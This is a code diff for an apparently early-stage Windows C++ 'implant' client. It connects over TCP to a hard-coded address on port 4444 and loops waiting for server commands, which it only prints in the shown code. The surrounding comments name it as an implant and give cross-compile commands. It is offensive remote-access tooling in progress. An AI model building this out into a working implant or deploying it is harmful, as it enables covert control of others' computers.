@@ -1,10 +1,10 @@
 #include "client.h"
 
 
-#include <winsock2.h>
 #include <stdio.h>
 #include <string.h>
 #include <windows.h>
+//#include <WS2tcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -12,6 +12,9 @@
 #define SERVER_IP "172.18.245.234"
 #define SERVER_PORT 4444
 #define BUFFER_SIZE 1024
+
+// TODO: move this somewhere else. and maybe make them enums?
+#define SUCCESSFUL 0
 
 // Command structure
 typedef struct {
@@ -68,6 +71,7 @@ void send_response(SOCKET sock, char* message) {
     send(sock, response, strlen(response), 0);
 }
 
+/*
 int main() {
     WSADATA wsa;
     SOCKET sock;
@@ -119,14 +123,162 @@ int main() {
     
     WSACleanup();
     return 0;
+}*/
+
+
+//g++ -o implant.exe main_implant.cpp implant.cpp -lws2_32 -static -std=c++11
+// x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32 -lstdc++
+// client.cpp
+
+Client::Client() : 
+    socket_(INVALID_SOCKET),
+    connected_(false),
+    initalized_(false)
+{
+    // TODO: add logic to check if winsock version 2.2 is avaiable?
+    //       this will need to be added/handled if planning on targeting windows xp and before
+
+    WSADATA wsaData;
+    WORD wVersionRequired = MAKEWORD(2,2); // use winsock version 2.2
+    if (WSAStartup(wVersionRequired, &wsaData) != 0)
+    {
+        // throw error
+    }
+    initalized_ = true;
+
+    // TODO: assign client an id? so server can keep track of all the clients
+    // TODO: add bool that checks/marks the client as initalized?
 }
+
+Client::~Client()
+{
+    if (initalized_)
+    {
+        WSACleanup();
+    }
+}
+
+bool Client::createSocket(int af, int type, int protocol)
+{
+    // TODO: add closesocket() ? 
+    socket_ = socket(af, type, protocol);
+    if (socket_ == INVALID_SOCKET)
+    {
+        return false;
+    }
+
+    connected_ = false;
+    return true;
+}
+
+bool Client::createConnection(const std::string& host, const std::string& port)
+{
+    ADDRINFOA hints, *result= nullptr; // struct addrinfo 
+
+    ZeroMemory(&hints, sizeof(hints));
+    // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform
+
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    // Resolve address
+    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0)
+    {
+        return false;
+    }
+
+    bool connected = false;
+    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
+    {
+        if (connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR)
+        {
+            connected = true;
+            break;
+        }
+    }
+    freeaddrinfo(result);
+    connected_ = connected;
+    return connected;
+}
+
+//void Client::receiveData()
+std::string Client::receiveData()
+{
+    if (!connected_) {
+        throw std::runtime_error("Not connected to server");
+    }
+    
+    int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
+    
+    if (result > 0) 
+    {
+        // Success - create string from the received data
+        return std::string(recvBuffer_, result);
+    } 
+    else if (result == 0) 
+    {
+        // Connection closed by server
+        connected_ = false;
+        throw std::runtime_error("Connection closed by server");
+    } 
+    else 
+    {
+        // Error occurred
+        connected_ = false;
+        throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
+    }
+}
+
+void Client::sendData(const std::string& data) {
+    if (!connected_) {
+        throw std::runtime_error("Not connected to server");
+    }
+    
+    int result = send(socket_, data.c_str(), data.length(), 0);
+    
+    if (result == SOCKET_ERROR) {
+        connected_ = false;
+        throw std::runtime_error("Send failed: " + std::to_string(WSAGetLastError()));
+    }
+    
+    //return result;  // Returns number of bytes actually sent
+}
+
+void Client::run(const std::string& host, const std::string& port)
+{
+    // Ensure socket is created
+    if (socket_ == INVALID_SOCKET && !createSocket()) {
+        std::cerr << "Failed to create socket" << std::endl;
+        return;
+    }
+    
+    // Connect to server
+    if (!createConnection(host, port)) {
+        std::cerr << "Failed to connect to " << host << ":" << port << std::endl;
+        return;
+    }
+    
+    std::cout << "Connected to " << host << ":" << port << ". Waiting for commands..." << std::endl;
+    
+    // Wait for incoming data from server
+    while (connected_) {
+        try {
+            std::string command = receiveData();
+            //sendData(command);
+            std::cout << "Server command: " << command << std::endl;
+            
+        } catch (const std::exception& e) {
+            std::cerr << "Connection lost: " << e.what() << std::endl;
+            break;
+        }
+    }
+    
+    std::cout << "Disconnected from server" << std::endl;
+} 
 
 
 /*
-//g++ -o implant.exe main_implant.cpp implant.cpp -lws2_32 -static -std=c++11
-// client.cpp
-#include "client.h"
-
 using namespace std;
 
 // BasicImplant implementation
@@ -391,3 +543,9 @@ namespace ImplantUtils {
     }
 }
 */
+
+int main()
+{
+    Client tcpClient;
+    tcpClient.run("172.18.245.234", "4444");
+}
